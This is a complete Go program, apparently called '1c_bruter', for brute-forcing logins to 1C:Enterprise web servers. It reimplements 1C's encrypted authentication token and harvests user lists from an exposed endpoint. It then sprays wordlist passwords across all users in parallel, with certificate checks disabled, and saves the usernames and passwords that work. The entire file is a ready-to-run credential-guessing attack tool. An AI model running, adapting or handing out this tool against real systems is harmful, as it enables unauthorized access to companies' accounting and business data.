package main

import (
	"bufio"
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/sha1"
	"crypto/sha256"
	"crypto/tls"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"flag"
	"fmt"
	"hash/crc32"
	"io"
	"log"
	"net/http"
	"os"
	"os/signal"
	"regexp"
	"sort"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"unicode"
)

// FIXED_IV используется для AES-CBC (для совместимости с 1С)
var FIXED_IV = []byte{157, 123, 154, 32, 105, 101, 187, 40, 6, 122, 72, 61, 178, 108, 113, 142}

type job struct {
	username string
	password string
}

// httpClient с поддержкой TLS 1.0+ и самоподписанных корпоративных сертификатов
var httpClient = &http.Client{
	Transport: &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true, //nolint: корпоративные серверы 1С используют самоподписанные сертификаты
			MinVersion:         tls.VersionTLS10,
		},
	},
}

// pad выполняет PKCS#7 padding.
func pad(src []byte, blockSize int) []byte {
	padding := blockSize - len(src)%blockSize
	padtext := bytes.Repeat([]byte{byte(padding)}, padding)
	return append(src, padtext...)
}

// encryptAESCBC шифрует данные в режиме AES-CBC с PKCS#7 padding.
func encryptAESCBC(key, plaintext, iv []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	plaintext = pad(plaintext, block.BlockSize())
	ciphertext := make([]byte, len(plaintext))
	mode := cipher.NewCBCEncrypter(block, iv)
	mode.CryptBlocks(ciphertext, plaintext)
	return ciphertext, nil
}

// sha1Base64 вычисляет SHA1-хеш строки и возвращает его base64-кодировку.
func sha1Base64(s string) string {
	h := sha1.Sum([]byte(s))
	return base64.StdEncoding.EncodeToString(h[:])
}

// generateAuthToken генерирует токен аутентификации по алгоритму 1С.
func generateAuthToken(password, username string) (string, error) {
	var tokenBytes bytes.Buffer

	// Версия токена: 1
	tokenBytes.WriteByte(1)

	// Первый блок шифрования
	randomBlock1 := make([]byte, 32)
	if _, err := rand.Read(randomBlock1); err != nil {
		return "", err
	}
	key1Data := []byte(sha1Base64(password))
	key1 := sha256.Sum256(key1Data)
	encryptedBlock1, err := encryptAESCBC(key1[:], randomBlock1, FIXED_IV)
	if err != nil {
		return "", err
	}
	tokenBytes.WriteByte(byte(len(encryptedBlock1)))
	tokenBytes.Write(encryptedBlock1)

	// Второй блок шифрования с password в верхнем регистре
	randomBlock2 := make([]byte, 32)
	if _, err := rand.Read(randomBlock2); err != nil {
		return "", err
	}
	key2Data := []byte(sha1Base64(strings.ToUpper(password)))
	key2 := sha256.Sum256(key2Data)
	encryptedBlock2, err := encryptAESCBC(key2[:], randomBlock2, FIXED_IV)
	if err != nil {
		return "", err
	}
	tokenBytes.WriteByte(byte(len(encryptedBlock2)))
	tokenBytes.Write(encryptedBlock2)

	// Добавление имени пользователя: 4 байта длины (little-endian) + имя
	usernameBytes := []byte(username)
	lenBuf := make([]byte, 4)
	binary.LittleEndian.PutUint32(lenBuf, uint32(len(usernameBytes)))
	tokenBytes.Write(lenBuf)
	tokenBytes.Write(usernameBytes)

	// Вычисление CRC32 для всех ранее записанных байт и добавление (4 байта, little-endian)
	crc := crc32.ChecksumIEEE(tokenBytes.Bytes())
	crcBuf := make([]byte, 4)
	binary.LittleEndian.PutUint32(crcBuf, crc)
	tokenBytes.Write(crcBuf)

	return base64.StdEncoding.EncodeToString(tokenBytes.Bytes()), nil
}

// getVersion делает GET-запрос к URL и извлекает версию по регулярному выражению.
func getVersion(baseURL string) (string, error) {
	resp, err := httpClient.Get(baseURL + "/")
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	bodyBytes, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}
	re := regexp.MustCompile(`var VERSION = "([0-9\.]+)"`)
	matches := re.FindStringSubmatch(string(bodyBytes))
	if len(matches) >= 2 {
		return matches[1], nil
	}
	return "", fmt.Errorf("не удалось извлечь версию")
}

// authenticate посылает POST-запрос с JSON-данными для аутентификации.
func authenticate(baseURL, version, credentials string) (bool, error) {
	postURL := fmt.Sprintf("%s/e1cib/login?version=%s", baseURL, version)
	payload := map[string]string{
		"cred": credentials,
	}
	jsonData, err := json.Marshal(payload)
	if err != nil {
		return false, err
	}
	req, err := http.NewRequest("POST", postURL, bytes.NewReader(jsonData))
	if err != nil {
		return false, err
	}
	req.Header.Set("Content-Type", "application/json")
	resp, err := httpClient.Do(req)
	if err != nil {
		return false, err
	}
	defer resp.Body.Close()
	return resp.StatusCode == http.StatusOK, nil
}

// fetchUsers получает список пользователей с сервера.
func fetchUsers(baseURL string) ([]string, error) {
	resp, err := httpClient.Get(baseURL + "/e1cib/users")
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("сервер вернул статус %d", resp.StatusCode)
	}
	bodyBytes, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}
	// Сервер может использовать \r\n или \n
	body := strings.ReplaceAll(string(bodyBytes), "\r\n", "\n")
	var trimmed []string
	for _, u := range strings.Split(body, "\n") {
		// Убираем все управляющие и невидимые символы (включая zero-width spaces)
		u = strings.Map(func(r rune) rune {
			if unicode.IsControl(r) || !unicode.IsPrint(r) {
				return -1
			}
			return r
		}, u)
		u = strings.TrimSpace(u)
		if u != "" {
			trimmed = append(trimmed, u)
		}
	}
	return trimmed, nil
}

// checkCredentials генерирует токен и проверяет учетные данные.
func checkCredentials(baseURL, version, username, password string) bool {
	token, err := generateAuthToken(password, username)
	if err != nil {
		log.Printf("Ошибка генерации токена для %s: %v", username, err)
		return false
	}
	ok, err := authenticate(baseURL, version, token)
	if err != nil {
		log.Printf("Ошибка аутентификации для %s: %v", username, err)
		return false
	}
	return ok
}

// decodeUTF16LE декодирует байты UTF-16 LE в строку.
func decodeUTF16LE(b []byte) string {
	if len(b)%2 != 0 {
		b = b[:len(b)-1]
	}
	runes := make([]rune, len(b)/2)
	for i := range runes {
		runes[i] = rune(b[2*i]) | rune(b[2*i+1])<<8
	}
	return string(runes)
}

// decodeUTF16BE декодирует байты UTF-16 BE в строку.
func decodeUTF16BE(b []byte) string {
	if len(b)%2 != 0 {
		b = b[:len(b)-1]
	}
	runes := make([]rune, len(b)/2)
	for i := range runes {
		runes[i] = rune(b[2*i])<<8 | rune(b[2*i+1])
	}
	return string(runes)
}

// decodeTextBytes определяет кодировку по BOM и возвращает текст в UTF-8.
func decodeTextBytes(data []byte) string {
	switch {
	case bytes.HasPrefix(data, []byte{0xEF, 0xBB, 0xBF}):
		return string(data[3:]) // UTF-8 BOM
	case bytes.HasPrefix(data, []byte{0xFF, 0xFE}):
		return decodeUTF16LE(data[2:]) // UTF-16 LE
	case bytes.HasPrefix(data, []byte{0xFE, 0xFF}):
		return decodeUTF16BE(data[2:]) // UTF-16 BE
	default:
		return string(data)
	}
}

// parseLines разбивает текст на непустые очищенные строки.
func parseLines(text string) []string {
	text = strings.ReplaceAll(text, "\r\n", "\n")
	text = strings.ReplaceAll(text, "\r", "\n")
	var result []string
	for _, line := range strings.Split(text, "\n") {
		line = strings.Map(func(r rune) rune {
			if unicode.IsControl(r) || !unicode.IsPrint(r) {
				return -1
			}
			return r
		}, line)
		line = strings.TrimSpace(line)
		if line != "" {
			result = append(result, line)
		}
	}
	return result
}

// loadLinesFromFile загружает строки из файла с поддержкой UTF-8, UTF-8 BOM, UTF-16 LE/BE.
func loadLinesFromFile(filename string) ([]string, error) {
	data, err := os.ReadFile(filename)
	if err != nil {
		return nil, err
	}
	return parseLines(decodeTextBytes(data)), nil
}

// countPasswordFileLines считает непустые строки в файле не загружая его в память (UTF-8/UTF-8 BOM).
// Для UTF-16 файлов делает полную загрузку (они обычно небольшие).
func countPasswordFileLines(filename string) int {
	f, err := os.Open(filename)
	if err != nil {
		return 0
	}
	bom := make([]byte, 3)
	n, _ := f.Read(bom)
	f.Close()
	bom = bom[:n]

	isUTF16 := (n >= 2 && bom[0] == 0xFF && bom[1] == 0xFE) ||
		(n >= 2 && bom[0] == 0xFE && bom[1] == 0xFF)
	if isUTF16 {
		lines, err := loadLinesFromFile(filename)
		if err != nil {
			return 0
		}
		return len(lines)
	}

	f2, err := os.Open(filename)
	if err != nil {
		return 0
	}
	defer f2.Close()
	if n >= 3 && bom[0] == 0xEF && bom[1] == 0xBB && bom[2] == 0xBF {
		f2.Seek(3, io.SeekStart)
	}
	scanner := bufio.NewScanner(f2)
	count := 0
	for scanner.Scan() {
		if strings.TrimSpace(scanner.Text()) != "" {
			count++
		}
	}
	return count
}

// feedPasswordsFromFile читает файл паролей построчно и отправляет задачи в канал.
// UTF-8 файлы читаются потоком без загрузки в память; UTF-16 загружаются полностью.
func feedPasswordsFromFile(filename string, users []string, jobs chan<- job) error {
	f, err := os.Open(filename)
	if err != nil {
		return err
	}
	bom := make([]byte, 3)
	n, _ := f.Read(bom)
	f.Close()
	bom = bom[:n]

	isUTF16 := (n >= 2 && bom[0] == 0xFF && bom[1] == 0xFE) ||
		(n >= 2 && bom[0] == 0xFE && bom[1] == 0xFF)
	if isUTF16 {
		lines, err := loadLinesFromFile(filename)
		if err != nil {
			return err
		}
		for _, password := range lines {
			for _, username := range users {
				jobs <- job{username, password}
			}
		}
		return nil
	}

	f2, err := os.Open(filename)
	if err != nil {
		return err
	}
	defer f2.Close()
	if n >= 3 && bom[0] == 0xEF && bom[1] == 0xBB && bom[2] == 0xBF {
		f2.Seek(3, io.SeekStart)
	}
	scanner := bufio.NewScanner(f2)
	for scanner.Scan() {
		password := strings.TrimSpace(scanner.Text())
		if password == "" {
			continue
		}
		for _, username := range users {
			jobs <- job{username, password}
		}
	}
	return scanner.Err()
}

// uniqueStrings убирает дубликаты, сохраняя порядок.
func uniqueStrings(input []string) []string {
	seen := make(map[string]bool)
	var result []string
	for _, s := range input {
		if !seen[s] {
			seen[s] = true
			result = append(result, s)
		}
	}
	return result
}

// uniqueStringsSorted убирает дубликаты и сортирует строки (для пользователей, как в Python).
func uniqueStringsSorted(input []string) []string {
	result := uniqueStrings(input)
	sort.Strings(result)
	return result
}

func main() {
	// Определение флагов командной строки
	userFlag := flag.String("u", "", "Имя пользователя для проверки пароля")
	usersFileFlag := flag.String("U", "", "Файл со списком пользователей")
	passwordFlag := flag.String("p", "", "Пароль для перебора")
	passwordFlagSet := false
	passwordsFileFlag := flag.String("P", "", "Файл со списком паролей")
	getUsersFlag := flag.Bool("l", false, "Получить список пользователей из информационной базы")
	verboseFlag := flag.Bool("v", false, "Выводить все попытки, включая неудачные")
	threadsFlag := flag.Int("t", 1, "Количество параллельных потоков")
	outputFlag := flag.String("o", "", "Файл для сохранения результатов")

	flag.Parse()
	flag.Visit(func(f *flag.Flag) {
		if f.Name == "p" {
			passwordFlagSet = true
		}
	})

	// Получаем URL из позиционного аргумента
	args := flag.Args()
	if len(args) < 1 {
		log.Fatal("URL не указан! Использование: 1c_bruter [-u USER] [-U FILE] [-p PASSWORD] [-P FILE] [-l] [-o OUTPUT] URL")
	}
	baseURL := args[0]

	if !strings.HasPrefix(baseURL, "http") {
		log.Fatalf("%s не является корректным URL!", baseURL)
	}

	// Получаем версию информационной базы
	version, err := getVersion(baseURL)
	if err != nil || version == "" {
		log.Fatalf("Не удалось определить версию! URL: %s, ошибка: %v", baseURL, err)
	}
	log.Printf("Версия: %s", version)

	// Режим только получения списка пользователей
	if *getUsersFlag && *userFlag == "" && *usersFileFlag == "" && !passwordFlagSet && *passwordsFileFlag == "" {
		users, err := fetchUsers(baseURL)
		if err != nil {
			log.Fatalf("Не удалось получить список пользователей: %v", err)
		}
		if len(users) == 0 {
			log.Fatal("Не удалось получить список пользователей!")
		}
		log.Printf("Найдено пользователей: %d", len(users))
		for _, user := range users {
			fmt.Println(user)
		}
		if *outputFlag != "" {
			err := os.WriteFile(*outputFlag, []byte(strings.Join(users, "\n")), 0644)
			if err != nil {
				log.Printf("Ошибка сохранения: %v", err)
			} else {
				log.Printf("Список пользователей сохранён в %s", *outputFlag)
			}
		}
		os.Exit(0)
	}

	// Загружаем пользователей
	var users []string
	if *userFlag != "" {
		users = append(users, *userFlag)
	}
	if *usersFileFlag != "" {
		lines, err := loadLinesFromFile(*usersFileFlag)
		if err != nil {
			log.Printf("Ошибка чтения файла с пользователями: %v", err)
		} else {
			users = append(users, lines...)
		}
	}
	if *getUsersFlag {
		fetched, err := fetchUsers(baseURL)
		if err != nil {
			log.Printf("Ошибка получения пользователей: %v", err)
		} else {
			users = append(users, fetched...)
		}
	}
	users = uniqueStringsSorted(users)
	if len(users) == 0 {
		log.Fatal("Пользователи не загружены!")
	}

	// Загружаем пароли (из -p; -P файл читается потоком, не грузится в память)
	var inlinePws []string
	if passwordFlagSet {
		inlinePws = []string{*passwordFlag}
	}
	pwCount := len(inlinePws)
	if *passwordsFileFlag != "" {
		if n := countPasswordFileLines(*passwordsFileFlag); n > 0 {
			pwCount += n
		} else {
			log.Printf("Предупреждение: файл с паролями пустой или недоступен: %s", *passwordsFileFlag)
		}
	}
	if pwCount == 0 {
		log.Fatal("Пароли не загружены!")
	}

	// Обработка Ctrl+C
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)
	go func() {
		<-sigChan
		log.Println("Прервано пользователем.")
		os.Exit(0)
	}()

	// Сводка перед перебором
	total := int64(len(users)) * int64(pwCount)
	log.Printf("Пользователей: %d, паролей: %d, всего попыток: %d", len(users), pwCount, total)
	if *verboseFlag {
		log.Printf("Пользователи: %q", users)
	}

	workers := *threadsFlag
	if workers < 1 {
		workers = 1
	}
	log.Printf("Потоков: %d", workers)

	jobs := make(chan job, workers*4)
	var wg sync.WaitGroup
	var mu sync.Mutex
	var tried int64
	var results []string

	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for j := range jobs {
				n := atomic.AddInt64(&tried, 1)
				if *verboseFlag {
					log.Printf("[%d/%d] Проверка: %s:%s", n, total, j.username, j.password)
				}
				if checkCredentials(baseURL, version, j.username, j.password) {
					result := fmt.Sprintf("%s:%s", j.username, j.password)
					mu.Lock()
					results = append(results, result)
					mu.Unlock()
					log.Printf("[+] Успешная аутентификация! Пользователь: %s, Пароль: %s", j.username, j.password)
				} else if *verboseFlag {
					log.Printf("[-] Неудачно: %s:%s", j.username, j.password)
				}
			}
		}()
	}

	for _, password := range inlinePws {
		for _, username := range users {
			jobs <- job{username, password}
		}
	}
	if *passwordsFileFlag != "" {
		if err := feedPasswordsFromFile(*passwordsFileFlag, users, jobs); err != nil {
			log.Printf("Ошибка чтения файла с паролями: %v", err)
		}
	}
	close(jobs)
	wg.Wait()

	log.Printf("Перебор завершён. Проверено: %d, найдено: %d", tried, len(results))

	// Сохранение результатов в файл
	if *outputFlag != "" && len(results) > 0 {
		err := os.WriteFile(*outputFlag, []byte(strings.Join(results, "\n")), 0644)
		if err != nil {
			log.Printf("Ошибка сохранения результатов: %v", err)
		} else {
			log.Printf("Результаты сохранены в %s", *outputFlag)
		}
	}
}
